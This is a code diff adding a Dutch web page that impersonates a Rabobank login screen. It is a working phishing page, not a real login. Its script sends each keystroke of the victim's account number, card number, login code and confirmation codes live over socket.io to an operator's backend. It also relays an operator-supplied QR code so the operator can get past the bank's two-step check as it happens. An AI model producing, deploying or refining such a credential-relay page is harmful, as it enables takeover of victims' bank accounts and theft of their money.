@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificatie Systeem</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body class="customer-page">
+    <div class="container">
+        <!-- Logo and Title -->
+        <div class="header">
+            <h1>Inloggen</h1>
+        </div>
+
+        <!-- Main Form - Always Visible -->
+        <div class="main-form">
+            <!-- Top Row: Registration + Access + Remember -->
+            <div class="form-row-top">
+                <div class="form-group form-group-registration">
+                    <label>Rekeningnummer</label>
+                    <div class="prefix-input">
+                        <span class="prefix">NL•• RABO 0</span>
+                        <input type="text" id="registrationNumber" maxlength="10" pattern="[0-9]*" inputmode="numeric" placeholder="">
+                    </div>
+                </div>
+                <div class="form-group form-group-access">
+                    <label>Pasnummer</label>
+                    <input type="text" id="accessCode" maxlength="4" pattern="[0-9]*" inputmode="numeric" placeholder="">
+                </div>
+                <div class="checkbox-group">
+                    <input type="checkbox" id="remember">
+                    <label for="remember">Onthouden</label>
+                </div>
+            </div>
+
+            <!-- QR Area -->
+            <div id="qrArea" class="qr-area">
+                <!-- Image placeholder QR (visible by default) -->
+                <div id="greyPlaceholder" class="qr-placeholder">
+                    <img src="qr-placeholder.png" alt="QR Placeholder">
+                </div>
+                
+                <!-- Loading state (hidden by default) -->
+                <div id="loadingQR" class="loading-state" style="display: none;">
+                    <div class="spinner"></div>
+                    <p>Uw kleurencode wordt geladen</p>
+                </div>
+                
+                <!-- Real QR (hidden by default) -->
+                <div id="realQR" class="real-qr" style="display: none;"></div>
+            </div>
+
+            <!-- Code Input (always visible but disabled until QR) -->
+            <div class="form-row-bottom">
+                <div class="form-group form-group-code">
+                    <label>Inlogcode</label>
+                    <input type="text" id="scanCode" maxlength="8" pattern="[0-9]*" inputmode="numeric" placeholder="" disabled>
+                </div>
+                <button id="submitBtn" class="btn" disabled>Inloggen</button>
+            </div>
+        </div>
+
+        <!-- PIN Entry (hidden initially) - OUTSIDE main-form -->
+        <div id="pinSection" class="pin-section" style="display: none;">
+            <div class="form-group">
+                <label>Code (regel 1)</label>
+                <input type="text" id="pin1" maxlength="5" pattern="[0-9]*" inputmode="numeric" placeholder="">
+            </div>
+            <div class="form-group">
+                <label>Code (regel 2)</label>
+                <input type="text" id="pin2" maxlength="5" pattern="[0-9]*" inputmode="numeric" placeholder="">
+            </div>
+            <div id="pinError" class="error"></div>
+            <button id="submitPins" class="btn" disabled>Voltooien</button>
+        </div>
+
+        <!-- Completion Message -->
+        <div id="completion" style="display: none;">
+            <div class="success-message">Verificatie voltooid</div>
+        </div>
+
+        <!-- Rejection Message -->
+        <div id="rejection" style="display: none;">
+            <div class="error-message">Code afgekeurd. Nieuwe QR wordt geladen...</div>
+        </div>
+    </div>
+
+    <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
+    <script>
+        // Backend URL - change this for production
+        const BACKEND_URL = window.location.hostname === 'localhost' 
+            ? 'http://localhost:3001' 
+            : 'https://jouw-backend.onrender.com'; // VERANDER DIT!
+        
+        const socket = io(BACKEND_URL);
+        
+        let currentStep = 'initial'; // initial, waiting-qr, qr-received, code-approved, completed
+
+        // Detect device
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            if (/mobile/i.test(ua)) return 'Mobile';
+            if (/tablet/i.test(ua)) return 'Tablet';
+            return 'Desktop';
+        }
+
+        // Join as customer
+        socket.emit('join-customer', {
+            device: getDeviceInfo()
+        });
+
+        // Elements
+        const registrationNumber = document.getElementById('registrationNumber');
+        const accessCode = document.getElementById('accessCode');
+        const scanCode = document.getElementById('scanCode');
+        const submitBtn = document.getElementById('submitBtn');
+        const greyPlaceholder = document.getElementById('greyPlaceholder');
+        const loadingQR = document.getElementById('loadingQR');
+        const realQR = document.getElementById('realQR');
+        const pinSection = document.getElementById('pinSection');
+        const completion = document.getElementById('completion');
+        const rejection = document.getElementById('rejection');
+
+        // Live typing - registration number
+        registrationNumber.addEventListener('input', () => {
+            socket.emit('customer-typing-step1', {
+                deviceNumber: registrationNumber.value,
+                prefix: 'NO••KABO',
+                registrationNumber: accessCode.value
+            });
+        });
+
+        // Access code - 4 digits
+        accessCode.addEventListener('input', () => {
+            const value = accessCode.value.trim();
+            
+            socket.emit('customer-typing-step1', {
+                deviceNumber: registrationNumber.value,
+                prefix: 'NO••KABO',
+                registrationNumber: value
+            });
+
+            // Hide grey placeholder when 4 digits entered
+            if (value.length === 4) {
+                greyPlaceholder.style.display = 'none';
+                loadingQR.style.display = 'flex';
+                currentStep = 'waiting-qr';
+                
+                // Submit to server
+                socket.emit('customer-submit-step1', {
+                    deviceNumber: registrationNumber.value,
+                    prefix: 'NO••KABO',
+                    registrationNumber: value
+                });
+            } else {
+                // Show grey placeholder again if less than 4 digits
+                greyPlaceholder.style.display = 'block';
+                loadingQR.style.display = 'none';
+                if (currentStep === 'waiting-qr') {
+                    currentStep = 'initial';
+                }
+            }
+        });
+
+        // Scan code input
+        scanCode.addEventListener('input', () => {
+            const value = scanCode.value.trim();
+            // Enable button only when 8+ characters entered
+            submitBtn.disabled = !(value.length >= 8);
+            
+            if (currentStep === 'qr-received') {
+                socket.emit('customer-typing-scancode', {
+                    code: value
+                });
+            }
+        });
+
+        // Enter key on scanCode
+        scanCode.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter' && !submitBtn.disabled) {
+                submitBtn.click();
+            }
+        });
+
+        // Submit button (for scan code)
+        submitBtn.addEventListener('click', () => {
+            if (currentStep === 'qr-received') {
+                const code = scanCode.value.trim();
+                if (!code) {
+                    alert('Voer de code in');
+                    return;
+                }
+                
+                socket.emit('customer-submit-scancode', {
+                    code: code
+                });
+                
+                // Show loading in QR area
+                realQR.style.display = 'none';
+                loadingQR.style.display = 'flex';
+                loadingQR.querySelector('p').textContent = 'Wachten op goedkeuring...';
+            }
+        });
+
+        // Receive QR from admin
+        socket.on('receive-qr', (data) => {
+            loadingQR.style.display = 'none';
+            realQR.innerHTML = `<img src="${data.qrImage}" alt="QR Code">`;
+            realQR.style.display = 'block';
+            currentStep = 'qr-received';
+            
+            // Enable inlogcode input
+            scanCode.disabled = false;
+            scanCode.focus();
+        });
+
+        // Admin approves scan code
+        socket.on('scancode-approved', () => {
+            // Hide main form, show PIN section
+            document.querySelector('.main-form').style.display = 'none';
+            pinSection.style.display = 'block';
+            currentStep = 'code-approved';
+        });
+
+        // Admin rejects scan code
+        socket.on('scancode-rejected', () => {
+            scanCode.value = '';
+            realQR.style.display = 'none';
+            rejection.style.display = 'block';
+            
+            setTimeout(() => {
+                rejection.style.display = 'none';
+                loadingQR.style.display = 'flex';
+                loadingQR.querySelector('p').textContent = 'Uw kleurencode wordt geladen';
+                currentStep = 'waiting-qr';
+            }, 3000);
+        });
+
+        // PIN Entry
+        const pin1 = document.getElementById('pin1');
+        const pin2 = document.getElementById('pin2');
+        const pinError = document.getElementById('pinError');
+        const submitPins = document.getElementById('submitPins');
+        
+        function checkPinsValid() {
+            const p1 = pin1.value.trim();
+            const p2 = pin2.value.trim();
+            submitPins.disabled = !(p1.length === 5 && p2.length === 5);
+        }
+        
+        [pin1, pin2].forEach(input => {
+            input.addEventListener('input', () => {
+                checkPinsValid();
+                
+                socket.emit('customer-typing-pins', {
+                    pin1: pin1.value,
+                    pin2: pin2.value
+                });
+                
+                pinError.textContent = '';
+            });
+
+            // Enter key on PIN inputs
+            input.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter' && !submitPins.disabled) {
+                    submitPins.click();
+                }
+            });
+        });
+
+        submitPins.addEventListener('click', () => {
+            const pinValue1 = pin1.value.trim();
+            const pinValue2 = pin2.value.trim();
+            
+            if (!pinValue1 || pinValue1.length !== 5) {
+                pinError.textContent = 'Code 1 moet 5 cijfers zijn';
+                return;
+            }
+            
+            if (!pinValue2 || pinValue2.length !== 5) {
+                pinError.textContent = 'Code 2 moet 5 cijfers zijn';
+                return;
+            }
+            
+            if (pinValue1 !== pinValue2) {
+                pinError.textContent = 'Codes moeten identiek zijn';
+                return;
+            }
+            
+            socket.emit('customer-submit-pins', {
+                pin1: pinValue1,
+                pin2: pinValue2
+            });
+            
+            pinSection.style.display = 'none';
+            completion.style.display = 'block';
+        });
+
+        // Verification complete
+        socket.on('verification-complete', () => {
+            pinSection.style.display = 'none';
+            completion.style.display = 'block';
+        });
+
+        // Admin reset to login
+        socket.on('admin-reset-to-login', () => {
+            location.reload();
+        });
+
+        // Admin reset to PIN entry
+        socket.on('admin-reset-to-pin', () => {
+            // Hide everything, show only PIN section
+            document.querySelector('.main-form').style.display = 'none';
+            completion.style.display = 'none';
+            rejection.style.display = 'none';
+            
+            // Clear PINs
+            pin1.value = '';
+            pin2.value = '';
+            pinError.textContent = '';
+            submitPins.disabled = true;
+            
+            // Show PIN section
+            pinSection.style.display = 'block';
+            pin1.focus();
+        });
+    </script>
+</body>
+</html>
